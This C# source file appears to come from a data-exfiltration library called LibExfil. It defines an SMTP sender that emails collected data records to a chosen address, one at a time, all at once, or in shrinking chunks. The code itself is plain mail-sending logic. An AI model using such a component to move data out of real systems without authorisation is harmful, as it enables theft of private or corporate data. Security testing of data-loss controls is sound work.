using LibExfil.Interfaces;
using LibExfil.Structures;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace LibExfil.DataSenders.ImplementedSenders
{
    class SMTPSender : IEmailSenderInterface
    {
        readonly SmtpClient smtpClient;
        string email_from;
        readonly string subject_line;
        readonly Options ops;
        readonly int Port;
        readonly NetworkCredential creds;
        readonly bool ssl;
        readonly string server;
        readonly string account_email;
         readonly string password;
        readonly string body;
        public SMTPSender(string email_from,string smtp_body, string subject_line,string server,string account_email,string password, Options opts=Options.NONE)
        {
            ops = opts;
            this.server = server;
            int port;
            if ((opts & Options.SMTP_SSL_HANDSHAKE) == Options.SMTP_SSL_HANDSHAKE)
                throw new NotImplementedException("SMTP is not going to be happening over port 465. Microsoft never implemented support for SMTP over SSL for System.Net.Mail.SmtpClient.  Now proceeding to Smash your junk.");
            if ((opts & Options.SMTP_STARTTLS_HANDSHAKE) == Options.SMTP_STARTTLS_HANDSHAKE)
                Port = 587;
            else 
                Port = 25;
            this.email_from = email_from;
            this.body = smtp_body;
            this.subject_line = subject_line;
            this.account_email = account_email;
            this.password = password;
            ssl = (Port==587)?true:false;
            
        }
        public int Send(DataRecordCollection data, string destination)
        {
            int sent = 0;
            foreach (DataRecord d in data.GetRecords())
            {
                if (d == null)
                    continue;
                var fromAddress = new MailAddress(email_from, email_from.Split('@')[0]);
                var toAddress = new MailAddress(destination, destination.Split('@')[0]);

                string email_body = d.ToString();

                var smtp = new SmtpClient
                {
                    Host = server,
                    Port = Port,
                    EnableSsl = ssl,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, password)
                };
                using (var msg = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject_line,
                    Body = this.body+"\n"+email_body
                })
                {
                    smtp.Send(msg);
                    ++sent;
                }
            }
            return sent;
        }

        /// <summary>
        /// send all records at once
        /// </summary>
        /// <param name="data">what to send</param>
        /// <param name="destination">what email address to send to</param>
        /// <returns>the number of records sent is returened, ie the row shape of the data</returns>
        public int SendAllRecords(DataRecordCollection data, string destination)
        {
            var fromAddress = new MailAddress(email_from, email_from.Split('@')[0]);
            var toAddress = new MailAddress(destination, destination.Split('@')[0]);
            string email_body = this.body+"\n"+data.ToString();



            var smtp = new SmtpClient
            {
                Host = server,
                Port = Port,
                EnableSsl = ssl,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, password)
            };
            using (var msg = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject_line,
                Body = email_body
            })
            {
                smtp.Send(msg);
            }

            return data.GetShape().Rows;




        }

        public int SendDecrementalEmails(DataRecordCollection data, string destination)
        {
            int sent = 0;
            int current_chunk = data.GetShape().Rows;
            while (sent < data.GetShape().Rows)
            {
                current_chunk /= 2;
                if (current_chunk == 0)
                    ++current_chunk;    //we need at least one more record if its here and the chunk size is zero
                int records_to_send = 0;
                if (sent + current_chunk >= data.GetShape().Rows)
                    records_to_send = data.GetShape().Rows - sent;
                else
                    records_to_send = current_chunk;
                DataRecordCollection drc = new DataRecordCollection(data.Schema);
                foreach (DataRecord d in data.GetRecords().Skip(sent).Take(records_to_send))
                    drc.AddRecord(d);
                SendAllRecords(drc, destination);
                sent += records_to_send;
            }
            return sent;
        }
    }
}
